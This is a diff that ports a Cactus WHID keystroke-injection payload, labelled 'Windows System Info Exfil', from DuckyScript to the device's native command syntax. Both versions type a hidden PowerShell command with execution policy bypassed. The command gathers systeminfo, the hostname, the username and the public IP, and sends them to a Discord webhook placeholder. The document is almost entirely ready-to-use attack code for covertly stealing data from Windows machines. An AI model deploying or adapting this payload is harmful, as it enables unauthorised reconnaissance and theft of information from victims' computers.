@@ -1,10 +1,8 @@
-REM === Cactus WHID Payload: Windows System Info Exfil ===
-REM Target: Windows 10/11
-REM Category: Recon & Exfil
-REM Description: Gathers hostname, username, IP, OS version and sends to Discord webhook
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$info = systeminfo | Out-String; $ip = (Invoke-WebRequest -Uri 'http://ifconfig.me/ip' -UseBasicParsing).Content; $body = @{content=\"``````$env:COMPUTERNAME | $env:USERNAME | $ip`n$info``````\"} | ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
-ENTER
+Rem: Cactus WHID Payload - Windows System Info Exfil
+Rem: Target - Windows 10/11
+Rem: Gathers hostname, username, IP, OS version and sends to Discord webhook
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$info = systeminfo | Out-String; $ip = (Invoke-WebRequest -Uri 'http://ifconfig.me/ip' -UseBasicParsing).Content; $body = @{content=\"``````$env:COMPUTERNAME | $env:USERNAME | $ip`n$info``````\"} | ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
